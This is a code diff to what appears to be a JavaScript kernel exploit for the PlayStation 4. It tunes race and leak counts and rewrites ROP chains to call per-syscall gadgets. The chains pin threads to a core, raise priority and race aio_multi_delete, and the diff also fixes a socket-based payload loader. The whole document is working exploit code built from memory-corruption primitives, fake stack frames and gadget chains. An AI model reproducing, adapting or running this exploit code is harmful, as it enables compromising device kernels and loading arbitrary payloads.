@@ -2,19 +2,19 @@
 // Uses primitives from inject.js (syscall, call, malloc, read/write functions)
 
 // Configuration
-const MAIN_CORE = 4;
+const MAIN_CORE = 7;  // PS4 can use core 7
 const MAIN_RTPRIO = 0x100;
 const PRI_REALTIME = 2;
 
 const NUM_WORKERS = 2;
 const NUM_GROOMS = 0x200;
 const NUM_HANDLES = 0x100;
-const NUM_RACES = 100;
+const NUM_RACES = 200;
 const NUM_SDS = 64;
 const NUM_SDS_ALT = 48;
 const NUM_ALIAS = 100;
 const LEAK_LEN = 16;
-const NUM_LEAKS = 16;
+const NUM_LEAKS = 32;
 const NUM_CLOBBERS = 8;
 
 // Syscall numbers (BigInt for direct use in ROP chains)
@@ -278,6 +278,17 @@ function is_error(val) {
     return val === -1 || val === 0xffffffff;
 }
 
+// Get per-syscall gadget from syscall_gadget_table
+// These gadgets have the form: mov eax, <num>; mov r10, rcx; syscall; ret
+function get_syscall_gadget(syscall_num) {
+    const num = Number(syscall_num);
+    const gadget = syscall_gadget_table[num];
+    if (!gadget) {
+        throw new Error("No gadget for syscall " + num);
+    }
+    return gadget;
+}
+
 // Helper: Wait for memory value to reach threshold
 function wait_for(addr, threshold, max_iterations = 10000000) {
     let count = 0;
@@ -349,17 +360,45 @@ function spawn_thread(fake_rop_array) {
     write64_uncompressed(thr_new_args + 0x30n, tid_addr);      // child_tid (output)
     write64_uncompressed(thr_new_args + 0x38n, cpid);          // parent_tid (output)
 
-    logger.log("thr_new_args @ " + hex(thr_new_args));
-    logger.log("calling thr_new...");
-    logger.flush();
+    // Call thr_new using ROP with syscall_wrapper (since thr_new may not have a dedicated gadget)
+    write64(add_rop_smash_code_store, 0xab0025n);
+    real_rbp = addrof(rop_smash(1)) + 0x700000000n - 1n + 2n;
 
-    const result = syscall(SYSCALL.thr_new, thr_new_args, 0x68n);
+    let i = 0;
+    fake_rop[i++] = g.get('pop_rax');
+    fake_rop[i++] = SYSCALL.thr_new;
+    fake_rop[i++] = g.get('pop_rdi');
+    fake_rop[i++] = thr_new_args;
+    fake_rop[i++] = g.get('pop_rsi');
+    fake_rop[i++] = 0x68n;
+    fake_rop[i++] = syscall_wrapper;
+
+    // Store return value
+    fake_rop[i++] = g.get('pop_rdi');
+    fake_rop[i++] = base_heap_add + fake_rop_return;
+    fake_rop[i++] = g.get('mov_qword_ptr_rdi_rax');
+
+    // Return to JS
+    fake_rop[i++] = g.get('pop_rax');
+    fake_rop[i++] = 0x2000n;
+    fake_rop[i++] = g.get('pop_rsp_pop_rbp');
+    fake_rop[i++] = real_rbp;
+
+    write64(add_rop_smash_code_store, 0xab00260325n);
+    oob_arr[39] = base_heap_add + fake_frame;
+    rop_smash(obj_arr[0]);
+
+    const result = read64(fake_rop_return);
+    logger.log("thr_new result: " + hex(result));
+    logger.flush();
 
     if (result !== 0n) {
         throw new Error("thr_new failed: " + hex(result));
     }
 
     const tid = read64_uncompressed(tid_addr);
+    logger.log("worker tid: " + hex(tid));
+    logger.flush();
     return tid;
 }
 
@@ -601,7 +640,7 @@ function call_suspend_chain(pipe_write_fd, thr_tid) {
 
 //
 // Race one attempt - builds ROP chain using BigUint64Array
-// Uses pop_rax + syscall number + syscall_wrapper (like PS5)
+// Uses per-syscall gadgets (mov eax, <num>; mov r10, rcx; syscall; ret)
 //
 function race_one(request_addr, tcp_sd, sds) {
     reset_race_state();
@@ -622,8 +661,7 @@ function race_one(request_addr, tcp_sd, sds) {
     write16_uncompressed(cpu_mask, BigInt(1 << MAIN_CORE));
 
     // Pin to core - cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, cpu_mask)
-    fake_rop_race1[rop_i++] = g.get('pop_rax');
-    fake_rop_race1[rop_i++] = SYSCALL.cpuset_setaffinity;
+    // Using per-syscall gadgets (mov eax, <num>; mov r10, rcx; syscall; ret)
     fake_rop_race1[rop_i++] = g.get('pop_rdi');
     fake_rop_race1[rop_i++] = 3n;  // CPU_LEVEL_WHICH
     fake_rop_race1[rop_i++] = g.get('pop_rsi');
@@ -634,22 +672,20 @@ function race_one(request_addr, tcp_sd, sds) {
     fake_rop_race1[rop_i++] = 0x10n;  // setsize
     fake_rop_race1[rop_i++] = g.get('pop_r8');
     fake_rop_race1[rop_i++] = cpu_mask;
-    fake_rop_race1[rop_i++] = syscall_wrapper;
+    fake_rop_race1[rop_i++] = get_syscall_gadget(SYSCALL.cpuset_setaffinity);
 
     const rtprio_buf = malloc(4);
     write16_uncompressed(rtprio_buf, PRI_REALTIME);
     write16_uncompressed(rtprio_buf + 2n, BigInt(MAIN_RTPRIO));
 
     // Set priority - rtprio_thread(RTP_SET, 0, rtprio_buf)
-    fake_rop_race1[rop_i++] = g.get('pop_rax');
-    fake_rop_race1[rop_i++] = SYSCALL.rtprio_thread;
     fake_rop_race1[rop_i++] = g.get('pop_rdi');
     fake_rop_race1[rop_i++] = 1n;  // RTP_SET
     fake_rop_race1[rop_i++] = g.get('pop_rsi');
     fake_rop_race1[rop_i++] = 0n;
     fake_rop_race1[rop_i++] = g.get('pop_rdx');
     fake_rop_race1[rop_i++] = rtprio_buf;
-    fake_rop_race1[rop_i++] = syscall_wrapper;
+    fake_rop_race1[rop_i++] = get_syscall_gadget(SYSCALL.rtprio_thread);
 
     // Signal ready - write 1 to ready_signal
     fake_rop_race1[rop_i++] = g.get('pop_rdi');
@@ -659,26 +695,22 @@ function race_one(request_addr, tcp_sd, sds) {
     fake_rop_race1[rop_i++] = g.get('mov_qword_ptr_rdi_rax');
 
     // Read from pipe (blocks here) - read(pipe_read_fd, pipe_buf, 1)
-    fake_rop_race1[rop_i++] = g.get('pop_rax');
-    fake_rop_race1[rop_i++] = SYSCALL.read;
     fake_rop_race1[rop_i++] = g.get('pop_rdi');
     fake_rop_race1[rop_i++] = pipe_read_fd;
     fake_rop_race1[rop_i++] = g.get('pop_rsi');
     fake_rop_race1[rop_i++] = pipe_buf;
     fake_rop_race1[rop_i++] = g.get('pop_rdx');
     fake_rop_race1[rop_i++] = 1n;
-    fake_rop_race1[rop_i++] = syscall_wrapper;
+    fake_rop_race1[rop_i++] = get_syscall_gadget(SYSCALL.read);
 
     // aio multi delete - aio_multi_delete(request_addr, 1, sce_errs + 4)
-    fake_rop_race1[rop_i++] = g.get('pop_rax');
-    fake_rop_race1[rop_i++] = SYSCALL.aio_multi_delete;
     fake_rop_race1[rop_i++] = g.get('pop_rdi');
     fake_rop_race1[rop_i++] = request_addr;
     fake_rop_race1[rop_i++] = g.get('pop_rsi');
     fake_rop_race1[rop_i++] = 1n;
     fake_rop_race1[rop_i++] = g.get('pop_rdx');
     fake_rop_race1[rop_i++] = sce_errs + 4n;
-    fake_rop_race1[rop_i++] = syscall_wrapper;
+    fake_rop_race1[rop_i++] = get_syscall_gadget(SYSCALL.aio_multi_delete);
 
     // Signal deletion - write 1 to deletion_signal
     fake_rop_race1[rop_i++] = g.get('pop_rdi');
@@ -688,11 +720,9 @@ function race_one(request_addr, tcp_sd, sds) {
     fake_rop_race1[rop_i++] = g.get('mov_qword_ptr_rdi_rax');
 
     // Thread exit - thr_exit(0)
-    fake_rop_race1[rop_i++] = g.get('pop_rax');
-    fake_rop_race1[rop_i++] = SYSCALL.thr_exit;
     fake_rop_race1[rop_i++] = g.get('pop_rdi');
     fake_rop_race1[rop_i++] = 0n;
-    fake_rop_race1[rop_i++] = syscall_wrapper;
+    fake_rop_race1[rop_i++] = get_syscall_gadget(SYSCALL.thr_exit);
 
     // Spawn thread with BigUint64Array
     logger.log("spawning worker thread...");
@@ -2591,7 +2621,7 @@ function bl_read_payload_from_socket(client_sock, max_size) {
 
     while (total_read < max_size) {
         const read_size = syscall(
-            SYSCALL.read),
+            SYSCALL.read,
             BigInt(client_sock),
             buf,
             BigInt(READ_CHUNK)
@@ -2661,7 +2691,7 @@ function bin_loader_main() {
     write32_uncompressed(sockaddr_len, 16);
 
     const client_sock = syscall(
-        SYSCALL.accept),
+        SYSCALL.accept,
         server_sock,
         sockaddr,
         sockaddr_len
